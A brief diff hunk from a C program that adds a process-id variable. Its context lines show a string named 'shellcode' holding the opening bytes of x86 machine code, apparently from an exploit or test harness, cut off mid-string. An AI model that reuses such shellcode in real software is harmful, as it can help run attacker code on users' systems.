@@ -22,6 +22,7 @@ int main(int argc, char **argv) {
   unused(argv);
 
   int ret, wstatus;
+  pid_t pid;
   struct utsname uts;
   char *pcall;
   char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x17"
